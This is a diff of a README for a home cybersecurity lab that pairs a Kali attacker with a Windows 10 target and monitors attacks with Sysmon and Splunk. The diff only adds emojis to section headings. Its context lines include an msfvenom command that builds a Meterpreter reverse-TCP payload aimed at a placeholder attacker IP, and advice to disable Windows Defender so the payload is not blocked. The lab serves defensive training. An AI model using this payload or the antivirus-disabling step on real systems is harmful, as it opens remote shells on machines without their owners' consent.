@@ -1,4 +1,4 @@
-# SOC Home Lab: Attack & Defense Simulation
+# 👨‍💻SOC Home Lab: Attack & Defense Simulation🚀
 
 ## Table of Contents
 1. [Introduction](#introduction)
@@ -16,7 +16,7 @@
 13. [Conclusion](#conclusion)
 
 ---
-## Introduction
+## 📌Introduction
 This project demonstrates the setup of a home lab environment for cybersecurity testing, including an attack machine (Kali Linux), a target machine (Windows 10 VM), and a logging system (Splunk) to monitor malicious activities. The project involves:
 - Setting up virtual machines
 - Installing and configuring Sysmon for log collection
@@ -24,7 +24,7 @@ This project demonstrates the setup of a home lab environment for cybersecurity 
 - Monitoring attacks using Splunk
 
 ---
-## Prerequisites
+## 🔧Prerequisites
 | Requirement                  | Description                                      |
 |------------------------------|--------------------------------------------------|
 | **RAM**                      | At least **16GB** (to run multiple VMs)         |
@@ -115,7 +115,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -
 3. Create alerts to detect suspicious behavior.
 
 ---
-## Troubleshooting
+## 🔍Troubleshooting
 ### 1. Metasploit Handler Not Receiving a Session
 - Ensure Windows Defender is **disabled** to prevent blocking the payload.
 - Double-check **LHOST and LPORT settings** in both `msfvenom` and `msfconsole`.
@@ -127,7 +127,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -
 - Restart Splunk and recheck the event index.
 
 ---
-## Next Steps & Future Improvements
+## 🎯Next Steps & Future Improvements
 - Integrate **ELK Stack** for enhanced log analysis.
 - Automate attack execution using **Python scripts**.
 - Implement **Wazuh SIEM** for better threat detection.
